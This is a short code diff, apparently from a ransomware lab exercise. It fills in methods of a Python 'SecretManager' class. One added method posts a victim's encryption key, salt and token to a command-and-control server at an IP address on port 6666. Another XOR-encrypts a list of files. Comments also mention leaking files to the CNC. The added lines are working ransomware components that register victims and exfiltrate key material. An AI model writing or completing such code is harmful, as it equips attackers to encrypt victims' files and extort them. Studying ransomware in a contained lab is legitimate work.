@@ -51,8 +51,14 @@ class SecretManager:
         return str(tmp, "utf8")
 
     def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
-        # register the victim to the CNC
-        raise NotImplemented()
+        url = "http://172.19.0.2:6666/new" #Register the victim to the CNC
+        data = {
+            "token": self.bin_to_b64(token),
+            "salt": self.bin_to_b64(salt),
+            "key": self.bin_to_b64(key)
+        }
+        response = requests.post(url, json=data)
+        response.raise_for_status()
 
     def setup(self)->None:
         # main function to create crypto data and register malware to cnc
@@ -75,8 +81,9 @@ class SecretManager:
         raise NotImplemented()
 
     def xorfiles(self, files:List[str])->None:
-        # xor a list for file
-        raise NotImplemented()
+        for file in files:
+            self._files_encrypted[str(file)] = xorfile(file, self._key)
+
 
     def leak_files(self, files:List[str])->None:
         # send file, geniune path and token to the CNC
